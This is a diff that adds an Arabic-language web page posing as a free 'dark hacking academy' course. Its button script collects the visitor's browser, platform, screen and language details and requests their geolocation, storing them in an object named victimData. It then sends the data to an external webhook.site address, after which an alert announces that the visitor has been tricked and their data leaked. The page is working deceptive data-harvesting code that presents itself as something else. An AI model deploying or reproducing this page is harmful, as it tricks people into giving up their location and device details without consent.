@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أكاديمية السايبر السوداء</title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            text-align: center;
+            padding: 50px 20px;
+            font-family: 'Courier New', monospace;
+        }
+        h1 {
+            font-size: 3rem;
+            text-shadow: 0 0 10px #0f0;
+            margin: 20px 0;
+            color: #f00;
+        }
+        p {
+            font-size: 1.5rem;
+            margin: 20px 0;
+            color: #ff0;
+        }
+        button {
+            background: #f00;
+            color: #fff;
+            font-size: 2rem;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 30px 0;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        #result {
+            margin-top: 30px;
+            font-size: 1.8rem;
+            color: #ff0;
+        }
+    </style>
+</head>
+<body>
+    <h1>أكاديمية الاختراق المظلم</h1>
+    <p>انقر لبدء التعلم المجاني!</p>
+    
+    <button id="hackButton">بدء التعلم الآن!</button>
+    <div id="result"></div>
+
+    <script>
+        document.getElementById("hackButton").addEventListener("click", function() {
+            const btn = this;
+            const result = document.getElementById("result");
+            
+            btn.textContent = "جاري التحميل...";
+            btn.disabled = true;
+            result.textContent = "جمع البيانات...";
+            
+            // جمع البيانات الأساسية
+            const victimData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                cookies: navigator.cookieEnabled
+            };
+            
+            // محاولة الحصول على الموقع
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    victimData.geo = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude
+                    };
+                    sendData(victimData);
+                }, error => {
+                    victimData.geo_error = error.message;
+                    sendData(victimData);
+                }, { timeout: 5000 });
+            } else {
+                sendData(victimData);
+            }
+        });
+        
+        function sendData(data) {
+            // الرابط الخاص بك من webhook.site
+            const WEBHOOK_URL = "https://webhook.site/8b28da6a-f0a3-4d61-8f22-4916b1de0dc2";
+            
+            // إرسال البيانات
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                document.getElementById("result").textContent = "تم الإرسال بنجاح!";
+                setTimeout(() => {
+                    alert("لقد تم خداعك بواسطة زاو فان!\nتم تسريب جميع بياناتك الشخصية");
+                }, 2000);
+            })
+            .catch(error => {
+                document.getElementById("result").textContent = "خطأ في الإرسال!";
+                console.error("Error:", error);
+            });
+        }
+    </script>
+</body>
+</html>
